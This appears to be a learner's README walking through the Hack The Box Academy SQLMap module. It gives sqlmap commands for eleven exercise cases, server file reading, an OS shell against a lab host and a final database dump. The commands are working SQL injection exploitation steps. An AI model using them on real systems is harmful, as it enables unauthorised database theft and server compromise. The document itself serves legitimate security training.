This repository contains my walkthrough and notes from the SQLMap Essentials module on Hack The Box Academy. The exercises and final assessment helped sharpen my skills in identifying and exploiting SQL Injection vulnerabilities using SQLMap.

## How to get case file?

Start Burp Suite and configure your browser to use it as a proxy (usually 127.0.0.1:8080).

Navigate to the vulnerable web page in your browser (e.g., the Catalog page or form submission).

Capture the request using the Proxy > HTTP history tab in Burp.

Right-click the request > "Save item" > Save it as Case1.txt, shop.txt, etc.

Format: Plain HTTP request (no headers or extra encoding)

File Extension: .txt (SQLMap accepts raw HTTP requests this way)

## Module Exercises ##

## Case 1: Basic Dump ##
```bash 
sqlmap -r Case1.txt --threads 10 --dump -T flag1 -D testdb --dbms=MySQL --batch
```
## Case 2: Simple Request ##
```bash
sqlmap -r Case2.txt --threads 10 --dump -T flag2 --batch
```
## Case 3: Cookie-Based Injection ##
```bash 
sqlmap -r Case3.txt -p cookie --threads 10 --dump -T flag3 --batch
```
## Case 4: Simple Dump ##
```bash
sqlmap -r Case4.txt --threads 10 --dump -T flag4 --batch
```
## Case 5: Time-Based Blind SQLi ##
```bash
sqlmap -r Case5.txt --batch --dump -T flag5 -D testdb \
--no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries
```
## Case 6: Using Prefix Payload ##
```bash
sqlmap -r Case6.txt --batch --dump -T flag6 -D testdb \
--no-cast --level=5 --risk=3 --prefix='`)'
```
## Case 7: Union-Based Injection ##
```bash
sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb \
--no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL
```
## Case 8: CSRF Token Handling ##
```bash
sqlmap -r case8.txt --batch -p "id" --csrf-token="t0ken" \
--dbms MySQL -D testdb -T flag8 --dump --flush-session --no-cast
```
## Case 9: Randomized Parameter ##
```bash
sqlmap -r Case9.txt -T flag9 --dump --risk=3 --level=5 --batch --randomize=uid
```
## Case 10: Random Agent ##
```bash
sqlmap -r case10.txt --batch -p "id" --random-agent \
--dbms MySQL -D testdb -T flag10 --dump --flush-session --no-cast
```
## Case 11: Tamper Script ##
```bash
sqlmap -r case11.txt --batch -p "id" --tamper=between \
--dbms MySQL -D testdb -T flag11 --dump --flush-session --no-cast
```
## File Reading & OS Shell ##
```bash
sqlmap -r read_file.txt --is-dba
sqlmap -r read_file.txt --file-read="/var/www/html/flag.txt"
cat ~/.local/share/sqlmap/output/94.237.58.172/files/_var_www_html_flag.txt
```
## OS Shell Access ##
```bash
sqlmap -u "http://94.237.58.172:59643?id=1" --os-shell --technique=E --batch
find / -type f -iname "*flag*" 2>/dev/null
```
## Skills Assessment: Minishop Web App ##

## Overview ##
**Application** : Minishop
**Pages Analyzed**: Blog, Contact Us, Catalog
### Findings
**Blog**: Not vulnerable (form action is '#')
**Contact Us**: Not vulnerable (form action is '#')
**Catalog (/shop)**: Vulnerable — uses JavaScript to post JSON to action.php

## Exploitation
### Intercepted request using Burp Suite
### Saved to shop.txt

## Exploited with SQLMap:
```bash
sqlmap -r shop.txt --batch -p 'id' --random-agent \
--tamper=between --dbms=MySQL -D production -T final_flag --dump
```
## Outcome

Successfully dumped final_flag table from the production database.

## Conclusion

**This module strengthened my understanding of:**

_SQL injection techniques (Boolean-based, Time-based, Union-based)
_
_Tamper scripts, CSRF tokens, and header injection_

_File read and OS shell interaction_

_Real-world application analysis and exploitation_

_I plan to continue my journey through the Hack The Box Pentester Pathway, with a focus on advanced web application testing, mobile app security, and red team tactics._

## 📜 License

This project is licensed under the MIT License.
